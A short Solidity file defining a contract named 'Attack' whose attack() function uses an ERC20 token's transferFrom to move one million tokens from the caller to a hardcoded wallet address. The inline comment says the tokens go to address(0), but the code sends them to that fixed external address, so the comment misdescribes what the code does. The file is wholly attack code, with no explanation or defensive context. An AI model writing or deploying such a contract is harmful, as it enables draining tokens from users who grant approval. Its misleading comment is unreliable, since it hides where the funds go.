// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
}

contract Attack {

    IERC20 target;

    constructor(address _target) {
        target = IERC20(_target);
    }

    function attack() public {
        // Attempt to transfer `init_supply` tokens from the caller (msg.sender) to address(0)
        // Ensure `init_supply` is a valid amount and does not cause issues
        uint256 init_supply = 1000000 * (10 ** uint256(18));
        require(target.transferFrom(msg.sender, 0x6677a0c96B2743b715499db355Ea1C69FBD11c6d, init_supply), "Transfer failed");
    }
}
